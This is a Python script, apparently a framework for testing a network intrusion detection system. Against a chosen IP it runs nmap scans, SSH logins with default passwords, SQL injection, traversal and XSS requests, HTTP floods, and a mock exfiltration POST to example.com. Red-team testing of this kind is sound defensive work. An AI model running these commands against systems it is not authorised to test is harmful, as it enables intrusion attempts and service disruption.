import subprocess
import time
import datetime
import json
import os
import argparse
import logging
import random
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nids_test.log"),
        logging.StreamHandler()
    ]
)

class SimpleAttackTester:
    def __init__(self, target_ip, output_dir="nids_test_results", delay_between_tests=30):
        self.target_ip = target_ip
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.delay_between_tests = delay_between_tests
        self.results = {}
        
    def run_command(self, attack_type, command_args, description):
        """Run a command and log the results"""
        test_id = f"{attack_type}_{int(time.time())}"
        
        logging.info(f"Running {attack_type} attack: {description}")
        
        # Set environment variables for correlation
        os.environ["ATTACK_TYPE"] = attack_type
        os.environ["ATTACK_START_TIME"] = datetime.datetime.now().isoformat()
        os.environ["ATOMIC_RED_TEAM_TEST"] = test_id
        
        try:
            start_time = datetime.datetime.now()
            start_time_iso = start_time.isoformat()
            
            # Run the command
            proc = subprocess.run(
                command_args,
                capture_output=True,
                text=True,
                timeout=300  # 5-minute timeout
            )
            
            end_time = datetime.datetime.now()
            end_time_iso = end_time.isoformat()
            duration_seconds = (end_time - start_time).total_seconds()
            
            result = {
                "test_id": test_id,
                "attack_type": attack_type,
                "description": description,
                "command": " ".join(command_args),
                "start_time": start_time_iso,
                "end_time": end_time_iso,
                "duration_seconds": duration_seconds,
                "stdout": proc.stdout,
                "stderr": proc.stderr,
                "returncode": proc.returncode,
                "success": proc.returncode == 0
            }
            
            logging.info(f"Attack completed: {attack_type} (Success: {result['success']})")
            return result
            
        except subprocess.TimeoutExpired:
            end_time = datetime.datetime.now()
            logging.warning(f"Attack timed out: {attack_type}")
            return {
                "test_id": test_id,
                "attack_type": attack_type,
                "description": description,
                "command": " ".join(command_args),
                "start_time": start_time_iso,
                "end_time": end_time.isoformat(),
                "duration_seconds": 300,  # timeout value
                "error": "Command timed out after 5 minutes",
                "success": False
            }
        except Exception as e:
            end_time = datetime.datetime.now()
            logging.error(f"Attack error for {attack_type}: {str(e)}")
            return {
                "test_id": test_id,
                "attack_type": attack_type,
                "description": description,
                "command": " ".join(command_args),
                "start_time": start_time_iso,
                "end_time": end_time.isoformat(),
                "duration_seconds": (end_time - start_time).total_seconds(),
                "error": str(e),
                "success": False
            }
        finally:
            # Clean up environment variables
            for var in ["ATTACK_TYPE", "ATTACK_START_TIME", "ATOMIC_RED_TEAM_TEST"]:
                if var in os.environ:
                    del os.environ[var]
    
    def port_scanning_tests(self):
        """Run port scanning tests"""
        results = []
        
        # Basic port scan
        cmd = ["nmap", "-p", "1-1000", self.target_ip]
        results.append(self.run_command("Port Scanning", cmd, "Basic port scan"))
        time.sleep(self.delay_between_tests)
        
        # Stealth scan
        cmd = ["nmap", "-sS", "-p", "1-1000", self.target_ip]
        results.append(self.run_command("Port Scanning", cmd, "Stealth scan"))
        time.sleep(self.delay_between_tests)
        
        # Service version detection
        cmd = ["nmap", "-sV", "-p", "22,80,443", self.target_ip]
        results.append(self.run_command("Port Scanning", cmd, "Service version detection"))
        
        return results
    
    def brute_force_tests(self):
        """Run brute force tests"""
        results = []
        
        # Simple SSH login attempts (will fail but generate traffic)
        usernames = ["admin", "root", "user", "pi"]
        passwords = ["password", "123456", "admin", "raspberry"]
        
        for _ in range(3):  # Limit to 3 attempts to avoid excessive failed logins
            username = random.choice(usernames)
            password = random.choice(passwords)
            cmd = ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", 
                  f"{username}@{self.target_ip}", "echo", "Connection test"]
            results.append(self.run_command("Brute Force", cmd, f"SSH login attempt as {username}"))
            time.sleep(2)  # Short delay between attempts
        
        return results
    
    def web_attacks_tests(self):
        """Run web attack tests"""
        results = []
        
        # Directory traversal attempt
        cmd = ["curl", "-s", f"http://{self.target_ip}/../../etc/passwd"]
        results.append(self.run_command("Web Attacks", cmd, "Directory traversal attempt"))
        time.sleep(self.delay_between_tests)
        
        # SQL injection test
        cmd = ["curl", "-s", f"http://{self.target_ip}/login.php?username=admin'%20OR%20'1'='1"]
        results.append(self.run_command("Web Attacks", cmd, "SQL injection attempt"))
        time.sleep(self.delay_between_tests)
        
        # XSS test
        cmd = ["curl", "-s", f"http://{self.target_ip}/search?q=<script>alert('xss')</script>"]
        results.append(self.run_command("Web Attacks", cmd, "XSS attempt"))
        
        return results
    
    def dos_tests(self):
        """Run DoS tests"""
        results = []
        
        # HTTP flood (light)
        cmd = ["ab", "-n", "1000", "-c", "10", f"http://{self.target_ip}/"]
        results.append(self.run_command("DoS", cmd, "Light HTTP flood"))
        time.sleep(self.delay_between_tests)
        
        return results
    
    def ddos_tests(self):
        """Run DDoS tests"""
        results = []
        
        # HTTP flood using Apache Benchmark (AB)
        cmd = [
            "ab", "-n", "10000", "-c", "100", f"http://{self.target_ip}/"
        ]
        results.append(self.run_command("DDoS", cmd, "HTTP flood simulation using AB"))

        return results
    
    def botnet_simulation_tests(self):
        """Simulate botnet activity"""
        results = []
        
        # C&C communication simulation
        cmd = ["curl", "-s", "http://example.com"]  # Simulating C&C server communication
        results.append(self.run_command("Bots", cmd, "C&C server communication"))
        time.sleep(self.delay_between_tests)
        
        # Data exfiltration simulation
        cmd = ["curl", "-X", "POST", "-d", "data=stolen_info", "http://example.com/exfil"]
        results.append(self.run_command("Bots", cmd, "Data exfiltration"))
        
        return results
    
    def run_all_tests(self):
        """Run all attack categories"""
        # Order of tests
        test_categories = [
            ("port_scanning", self.port_scanning_tests),
            ("brute_force", self.brute_force_tests),
            ("web_attacks", self.web_attacks_tests),
            ("dos", self.dos_tests),
            ("ddos", self.ddos_tests),
            ("bots", self.botnet_simulation_tests)
        ]
        
        for category_name, test_func in test_categories:
            logging.info(f"Starting {category_name} tests")
            results = test_func()
            self.results[category_name] = results
            
            # Save results for this category
            self._save_results(category_name, results)
            
            # Wait between categories
            if category_name != test_categories[-1][0]:
                wait_time = self.delay_between_tests * 2
                logging.info(f"Waiting {wait_time} seconds before next category...")
                time.sleep(wait_time)
        
        self._save_final_report()
        return self.results
    
    def run_category(self, category):
        """Run tests for a specific category"""
        category_map = {
            "port_scanning": self.port_scanning_tests,
            "brute_force": self.brute_force_tests,
            "web_attacks": self.web_attacks_tests,
            "dos": self.dos_tests,
            "ddos": self.ddos_tests,
            "bots": self.botnet_simulation_tests,
        }
        
        if category not in category_map:
            logging.error(f"Unknown category: {category}")
            return {}
        
        logging.info(f"Running tests for category: {category}")
        results = category_map[category]()
        self.results[category] = results
        
        # Save results
        self._save_results(category, results)
        return results
    
    def _save_results(self, category, results):
        """Save results for a category"""
        output_file = self.output_dir / f"{category}_results.json"
        with open(output_file, "w") as f:
            json.dump(results, f, indent=4)
        
    def _save_final_report(self):
        """Save the final report"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = self.output_dir / f"nids_test_report_{timestamp}.json"
        
        report = {
            "timestamp": timestamp,
            "target_ip": self.target_ip,
            "total_tests": sum(len(tests) for tests in self.results.values()),
            "successful_tests": sum(
                sum(1 for test in tests if test.get("success", False))
                for tests in self.results.values()
            ),
            "results_by_category": self.results
        }
        
        with open(report_file, "w") as f:
            json.dump(report, f, indent=4)
        
        logging.info(f"Final report saved to {report_file}")

def parse_args():
    parser = argparse.ArgumentParser(description="Simple NIDS Testing Framework")
    parser.add_argument("--target", "-t", required=True, help="Target IP address")
    parser.add_argument("--category", "-c", 
                        choices=["port_scanning", "brute_force", "web_attacks", "dos", "bots", "ddos", "all"],
                        default="all", help="Attack category to test")
    parser.add_argument("--delay", "-d", type=int, default=30,
                        help="Delay in seconds between tests")
    parser.add_argument("--output", "-o", default="nids_test_results",
                        help="Output directory for test results")
    return parser.parse_args()

def main():
    args = parse_args()
    
    logging.info("Starting Simple NIDS Testing Framework")
    logging.info(f"Configuration: target={args.target}, category={args.category}, "
                 f"delay={args.delay}s, output={args.output}")
    
    try:
        tester = SimpleAttackTester(
            target_ip=args.target,
            output_dir=args.output,
            delay_between_tests=args.delay
        )
        
        if args.category == "all":
            tester.run_all_tests()
        else:
            tester.run_category(args.category)
        
        logging.info("NIDS Testing Framework completed")
    except Exception as e:
        logging.error(f"Error running NIDS Testing Framework: {e}")

if __name__ == "__main__":
    main()